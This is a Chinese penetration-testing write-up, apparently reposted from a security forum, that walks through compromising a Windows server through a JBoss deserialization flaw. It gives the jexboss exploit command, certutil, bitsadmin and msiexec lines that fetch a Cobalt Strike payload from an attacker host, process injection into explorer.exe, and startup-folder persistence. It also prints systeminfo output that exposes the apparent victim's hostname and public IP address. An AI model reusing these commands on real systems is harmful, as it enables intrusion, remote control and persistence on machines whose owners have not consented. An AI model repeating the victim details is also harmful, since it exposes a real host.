---
title: 记一次从jboss到内网渗透实战
url: https://buaq.net/go-148186.html
source: unSafe.sh - 不安全
date: 2023-02-07
fetch_date: 2025-10-04T05:50:07.947723
---

# 记一次从jboss到内网渗透实战

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/335e02eb6b9a97a754be1ea34fc50f07.jpg)

记一次从jboss到内网渗透实战

jexbossKali LinuxCS 4.3Windows杀软在线查询一Windows杀软在线查询二Windows杀软在线查询三BrowserGhos
*2023-2-6 18:15:24
Author: [xz.aliyun.com(查看原文)](/jump-148186.htm)
阅读量:49
收藏*

---

[jexboss](https://github.com/joaomatosf/jexboss)

Kali Linux

CS 4.3

[Windows杀软在线查询一](https://www.ddosi.org/av/1.php)

[Windows杀软在线查询二](https://www.adminxe.com/CompareAV/index.php)

[Windows杀软在线查询三](http://payloads.net/kill_software/)

[BrowserGhost](https://github.com/QAX-A-Team/BrowserGhost)

[fscan](https://github.com/shadow1ng/fscan)

[向日葵](https://sunlogin.oray.com/download?categ=personal)

1、在一次红蓝对抗时，发现了jboss反序列化漏洞，真的是老天爷赏饭吃

2、利用jexboss直接拿shell

```
python jexboss.py -u http://xx.xx.xx.xx/
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173316-490a2906-a601-1.png)

3、查看当前用户`whoami`，管理员权限

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173346-5aab1e22-a601-1.png)

4、查看IP地址`ipconfig`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173505-89ab4454-a601-1.png)

5、查看是否有杀软`tasklist /svc`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173606-ae0b4178-a601-1.png)

6、将查询的内容粘贴到Windows杀软在线查询，发现不存在杀软

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173621-b6f53398-a601-1.png)

7、查看服务器是否出网`ping www.baidu.com`，很不错，服务器出网

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173712-d5b634f8-a601-1.png)

1、启动C2服务器，生成powershell上线语句`攻击 -> web钓鱼 -> web投递`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173808-f6c26f2c-a601-1.png)

2、将生成的powershell语句在jexbos shell中执行，发现CS无法上线，推测可能禁用powershell

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206173855-12a886fe-a602-1.png)

3、powershell无法成功，我们下载exe文件到服务器，由于目标是windows服务器，需要执行Windows的下载命令，下载完成后，执行`dir`验证下载成功

```
certutil -urlcache -split -f http://xx.xx.xx.xx:81/bypass123.exe

bitsadmin /transfer myDownLoadJob /download /priority normal http://xx.xx.xx.xx:81/bypass123.exe c:\windows\temp\bypass123.exe

msiexec /q /i http://xx.xx.xx.xx:81/bypass123.exe
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174020-45b037f4-a602-1.png)

4、执行111.exe文件，CS成功上线

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174059-5cab4818-a602-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174215-8a0e5d86-a602-1.png)

### 设置延迟时间

1、一般我会设置为sleep 2，不快不慢刚刚好。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174259-a42e7534-a602-1.png)

### 进程迁移

1、首先查看进程列表`浏览探测 -> 进程列表`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174350-c29ea98a-a602-1.png)

2、选择需要注入的进程并点击inject进行注入（进程可以选择一些比较常见的，不会常关闭的进程，如explorer.exe），然后便可以获取一个基于explorer.exe的shell。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174433-dc8249ba-a602-1.png)

### 启动项

1、将需要执行的exe文件复制到启动文件夹下即可。 复制到的路径是windows启动路径，当系统重启之后，会默认运行里面的程序

```
shell copy "111.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230206174528-fd5c6576-a602-1.png)

### 版本信息和补丁

1、主要查看主机版本信息和补丁`shell systeminfo`，以下是详细内容，发现是`Windows server 2012 R2`

```
Nombre de host:                            WIN-VG2ABKNMR7G
Nombre del sistema operativo:              Microsoft Windows Server 2012 R2 Standard
Versión del sistema operativo:             6.3.9600 N/D Compilación 9600
Fabricante del sistema operativo:          Microsoft Corporation
Configuración del sistema operativo:       Servidor independiente
Tipo de compilación del sistema operativo: Multiprocessor Free
Propiedad de:                              Usuario de Windows
Organización registrada:
Id. del producto:                          00252-70000-00000-AA535
Fecha de instalación original:             01/03/2022, 05:30:55 p. m.
Tiempo de arranque del sistema:            14/01/2023, 10:17:27 a. m.
Fabricante del sistema:                    Dell Inc.
Modelo el sistema:                         Precision T1500
Tipo de sistema:                           x64-based PC
Procesador(es):                            1 Procesadores instalados.
                                           [01]: Intel64 Family 6 Model 30 Stepping 5 GenuineIntel ~1333 Mhz
Versión del BIOS:                          Dell Inc. 2.2.0, 06/07/2010
Directorio de Windows:                     C:\Windows
Directorio de sistema:                     C:\Windows\system32
Dispositivo de arranque:                   \Device\HarddiskVolume1
Configuración regional del sistema:        es-mx;Español (México)
Idioma de entrada:                         N/D
Zona horaria:                              (UTC-06:00) Guadalajara, Ciudad de México, Monterrey
Cantidad total de memoria física:          8,151 MB
Memoria física disponible:                 3,276 MB
Memoria virtual: tamaño máximo:            28,872 MB
Memoria virtual: disponible:               3,029 MB
Memoria virtual: en uso:                   25,843 MB
Ubicación(es) de archivo de paginación:    C:\pagefile.sys
Dominio:                                   WORKGROUP
Servidor de inicio de sesión:              \\WIN-VG2ABKNMR7G
Revisión(es):                              31 revisión(es) instaladas.
                                           [01]: KB2959936
                                           [02]: KB2896496
                                           [03]: KB2919355
                                           [04]: KB2920189
                                           [05]: KB2928120
                                           [06]: KB2931358
                                           [07]: KB2931366
                                           [08]: KB2933826
                                           [09]: KB2938772
                                           [10]: KB2949621
                                           [11]: KB2954879
                                           [12]: KB2958262
                                           [13]: KB2958263
                                           [14]: KB2961072
                                           [15]: KB2965500
                                           [16]: KB2966407
                                           [17]: KB2967917
                                           [18]: KB2971203
                                           [19]: KB2971850
                                           [20]: KB2973351
                                           [21]: KB2973448
                                           [22]: KB2975061
                                           [23]: KB2976627
                                           [24]: KB2977629
                                           [25]: KB2981580
                                           [26]: KB2987107
                                           [27]: KB2989647
                                           [28]: KB2998527
                                           [29]: KB3000850
                                           [30]: KB3003057
                                           [31]: KB3014442
Tarjeta(s) de red:                         1 Tarjetas de interfaz de red instaladas.
                                           [01]: Gigabit Ethernet Broadcom NetLink (TM)
                                                 Nombre de conexión: Ethernet
                                                 DHCP habilitado:    No
                                                 Direcciones IP
                                                 [01]: 148.204.110.122
                                                 [02]: fe80::158e:f622:de98:a186
Requisitos Hyper-V:                        Extensiones de modo de monitor de VM: Sí
                   ...